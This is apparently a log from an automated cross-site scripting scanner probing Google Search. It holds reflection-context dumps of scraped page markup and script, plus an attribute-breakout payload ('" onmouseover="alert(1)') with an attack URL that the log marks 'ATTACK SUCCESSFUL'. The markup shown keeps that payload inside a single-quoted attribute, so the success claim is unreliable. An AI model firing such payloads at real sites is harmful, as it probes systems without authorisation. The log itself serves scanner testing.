year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8QpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x27(uvw\x22xyz\x26#39;yxz\x26lt;/zxy site:www.psu.edu\x27 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8QpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [12]
+<a href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu&amp;gbv=1&amp;sei=sU2UXpLBO6mL4-EP1diz-AY">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fq%3D(uvw%2522xyz%27yxz%253C/zxy%26as_sitesearch%3Dwww.psu.edu" target="_top">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Q_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Q_AUoAnoECAEQBA">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Q_AUoA3oECAEQBQ">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Q_AUoAHoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Q_AUoAXoECAEQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3D(uvw%2522xyz%2527yxz%253C/zxy%26as_sitesearch%3Dwww.psu.edu" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Qo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3D(uvw%2522xyz%2527yxz%253C/zxy%26as_sitesearch%3Dwww.psu.edu#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Qo_oBegQIARAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/setprefs?safeui=on&amp;sig=0_ulf0E_xCOtzkTorpNOKkgL4UyEA%3D&amp;prev=https://www.google.com/search?q%3D(uvw%2522xyz%2527yxz%253C/zxy%26as_sitesearch%3Dwww.psu.edu" id="safesearch" data-ved="2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Qo_oBegQIARAM">
+<a href="/advanced_search?q=(uvw%22xyz'yxz%3C/zxy+site:www.psu.edu&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjS3aP0puXoAhWpxTgGHVXsDG8Qo_oBegQIARAN">
+<meta content="0;url=/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.psu.edu&amp;gbv=1&amp;sei=sU2UXpLBO6mL4-EP1diz-AY" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	True	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)']
+
+ATTR Attack Url: https://www.google.com/search?q=" onmouseover="alert(1)&as_sitesearch=www.psu.edu
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='" onmouseover="alert(1) site:www.psu.edu' aria-label="Search" data-ved="0ahUKEwiO0KL2puXoAhWzyDgGHXh9D6oQ39UDCAk">
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.google.com/search?q=&as_sitesearch=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value="site:(uvw%22xyz%27yxz%3C/zxy" aria-label="Search" data-ved="0ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQ39UDCAk">
+<div jsdata="GXYZuf;;Bb8yXs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iZAS6epMxxWc">
+
+----------------------------------------------------------------------------------
+HTML Context: [3]
+<title>site:(uvw%22xyz%27yxz%3C/zxy - Google Search</title>
+<b>(uvw%22xyz%27yxz%3C/zxy</b>
+<em>site:(uvw%22xyz%27yxz%3C/zxy</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="ZgHT35qnl2FsURrlqdz3Mw==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22z2WbSYT8VdaJGMexYd_w5aNqPDs\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iZAS6epMxxWc","r-iZAS6epMxxWc",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['Bb8yXk','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22site:(uvw%22xyz%27yxz%3C/zxy\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22z2WbSYT8VdaJGMexYd_w5aNqPDs\x22,\x22\x22,\x22uE2UXtD-EdGR4-EPrJehiAM\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','Bb8yXo','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22site:(uvw%22xyz%27yxz%3C/zxy\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','Bb8yXs','[0,\x22inline\x22,2,2500,0,0]\n','Bb8yXw','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586777528\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','Bb8yX0','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9zts93Heno8MFvm8zmd27eV55m3jQPA:1586777528394\x22,3]\n','Bb8yX4','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586777528294736,104384721,822627244]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"ZgHT35qnl2FsURrlqdz3Mw\u003d\u003d","ekXXzb":"13px","ZMFELd":"false","p7BdKe":"true","pDiOce":"false","n1Whrf":"false","bDOvJc":"false","KD9WYe":"#1A73E8","pch72b":"false","uRoR4d":"false","Fcb4A":"#1A73E8","NW4nA":"rgba(255,255,255,.7)","gir54":"0.4","VbmVYd":"true","pPtK5":"6","khoEPb":"#1a0dab","B0husb":"true","X4yPd":"#1c3aa9","prFQBe":"#ebebeb","SuQiSc":"1.3","SidP2e":"rgba(248, 248, 248, 0)","QldWK":"6","y2Hs7d":"false","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","Rnt1Qc":"false","wlwuHd":"false","oFa0q":"#fafafa","a8Umdd":"rgba(153,153,153,.4)","buGAI":"16","FYBlgf":"false","eE52Jd":"#5f6368","u4NTBb":"40","voc95c":"false","JRGsye":"none","oyB9kf":"rgba(0,0,0,.87)","fQC6Cf":"2px","OqjdAf":"true","eo8dye":"#878787","iwHJId":"15","R9GQh":"#fff","TKn0F":"20px","PngPbb":"rgba(0,0,0,.87)","X4DPRd":"true","hbfefd":"#1A73E8","Na6wt":"#e1e1e1","U6xP0":"#4285f4","rZYUef":"#f5f5f5","T1V3fc":"#f4b400","V6eh7c":"16","PYrjqe":"40","g635Ab":"2px","PIn0Ab":"1px solid #DFE1E5","N31mf":"false","MOPyub":"15","kvKIW":"false","nMRhJe":"false","KdGe5c":"false","MiTaT":"#1A73E8","z1x4kc":"true","A5tF3b":"false","fjc61":"false","tqmosb":"#fff","lLCPB":"true","HWmJg":"#dcdcdc","IfHuyb":"rgba(0,0,0,.54)","imHXAf":"true","rX9Pnb":"16","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","D8A8he":"true","EJG4vf":"pointer","RZ03Ve":"#5677fc","ZzVVh":"false","SezQgf":"500","kkVYtc":"false","KgXmrd":"true","L6WyEf":"true","wku5sd":"false","jIrJIf":"14","ZLr84e":"true","o07h3e":"0 4px 5px rgba(0,0,0,.16)","RpI44b":"#ebebeb","aUt4Tc":"false","j9ZYRc":"true","bXvyY":"#fff","GTYTQ":"#ffeb3b","tpLZye":"#fff","s6Rzec":"0 16px","F4ULTd":"true","a7rhWc":"false","Mlljec":"false","j0DpSe":"false","AYXCHc":"false","Nk1Bhf":"#4285f4","B8Dib":"rgba(0,0,0,.87)","AwPxw":"false","EqX55c":"652","ZxI7Af":"#fafafa","fRkoq":"true","dAFa0e":"false","ruHO7c":"#dd191d","A2aVpb":"50","wFGKdc":"false","haqSDf":"rgba(0,0,0,.54)","AYVQWe":"20px","dTMnbc":"false","BYw9f":"false","xvI8we":"#212121","owXwYb":"#f8f8f8","JyBo2c":"false","FF58Bf":"true","xeVOLe":"#689f38","sBpVac":"rgba(0,0,0,.26)","pxDH4c":"#0f9d58","bVUXme":"25","ymIfqf":"18","osNyZ":"1.0","seVajd":"rgba(0,0,0,.12)","K2vQjf":"#f8f8f8","SpZHZd":"true","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","SfSmD":"#ebebeb","WnrBce":"rgba(0,0,0,.1)","yFVHo":"true","ToXxme":"#e5e5e5","bmQ7Rb":"false","W445Dc":"20","NIYCKf":"28","wB1JTc":"false","zhBJde":"false","YWHUvb":"18px","o9mzkf":"false","Vzh4p":"0px 7px 6px -5px #DFE1E5","S1ZUDf":"true","klgere":"invert(1) hue-rotate(180deg)","rx1dvd":"#f3f3f3","Ym5Ycb":"false","OjG6Qc":"#000","FbN3Qc":"rgba(0,0,0,.87)","b1KZw":"#fff","X1bUEc":"arial,sans-serif-medium,sans-serif","o28sBd":"false","QSF9Ec":"","UnFEre":"16","EgTnfe":"true","i7mh3e":"16","TUhOL":"#fafafa","rRLesf":"0","ENmP1c":"rgba(204,204,204,.15)","iDTSkb":"true","Tae7A":"true","tuTJ6d":"#b8b8b8","hWyTvf":"false","v44rSc":"#70757a","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","LnZAkd":"false","PuOePe":"false","AEMHld":"#eeeeee","KFdH8":"true","aD6AQe":"#757575","lzJv9d":"#fff","ue6nDb":"Roboto-Medium,Roboto-Regular","qkXvHd":"500","rWPbFe":"rgba(255,255,255,1)","gbf9Eb":"58","hgWJ8c":"false","I69zkb":"rgba(204,204,204,.25)","zHtpPb":"false","rsd6be":"1","BW8dtd":"rgba(248, 248, 248, 1)","xz9C5b":"true","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","aKuscd":"#AECBFA","gqXETb":"#db4437","EuCkcd":"16","sPiebd":"false","srQSvc":"true","xT28q":"false","umYEvb":"false","xBx7Dc":"36","AQEr7b":"#c6c6c6","BdVmgf":"16","k7G1xb":"15","Sgnmlc":"14px","PxA5sf":"rgba(0,0,0,.54)","QDXUyc":"#188038","JpB3Ue":"60","By1ejd":"16","vhCwfc":"false","eXPt4e":"400","iKzRxb":"#5f6368","IvNqzc":"true","tqXjO":"false","GzC2p":"#fff","vIMrp":"true","xFbXr":"rgba(0,102,33,1)","Hzi6pf":"#DFE1E5","y1HZEd":"false","UNVSy":"false","QA73ad":"false","hqg9c":"#1878f0","FydCC":"true","KVmtZc":"rgba(255,255,255,.3)","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","auaxA":"#222","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","q7vEEb":"false","FiZWae":"32","NvsKMd":"true","mJempe":"13","gjAni":"#3c4043","WMBRj":"#009688","AP8pqf":"rgba(0,0,0,.12)","kL6Xwb":"false","LACYrf":"false","RJegIe":"#fffff0","MoAfyf":"#fff","S7nbec":"16","xDKXr":"false","ib0wve":"rgba(153,153,153,.2)","Utapxe":"-webkit-","XgWQKd":"true","tJ4Jdf":"11","LIYDac":"arial,sans-serif","ODgkgd":"#fff","HjM8R":"#FFF","WWz0vd":"false","V0Bluc":"none","qj36Ef":"#323232","e2p8ee":"false","iniaFd":"true","qmiCId":"true","WxHUzd":"true","kePaAc":"-4","JVBnre":"false","JcUGee":"rgba(0,0,0,.54)","fFepd":"-15","cdRSXc":"false","kVbEH":"false","YXGVrd":"true","y519we":"true","ppkaeb":"0","VXIo7d":"8px","Vdtb3d":"true","Dc0uuf":"16","in3Ilb":"#222","lVRwic":"false","BoqNoc":"20px","bmAEG":"#d9d9d9","tyCgpc":"#fff","EiEfXb":"#ebebeb","KTkDB":"false","z70S0c":"false","iryGqc":"2","h29koe":"32","BwgO5":"16","KnXmRc":"10","SATNMc":"1px solid #dfe1e5","pLhKvc":"0","abZ6pc":"#f9a825","VQfWj":"#c0c0c0","VnH1Zb":"normal","QnH6ad":"16","eGDqv":"false","ConpTc":"false","jg5SCd":"false"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","ZgHT35qnl2FsURrlqdz3Mw\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586777528294736,104384721,822627244]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw1wBSjycTpZHeW3-e_iyijE\x26ust\x3d1586863928335694';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var 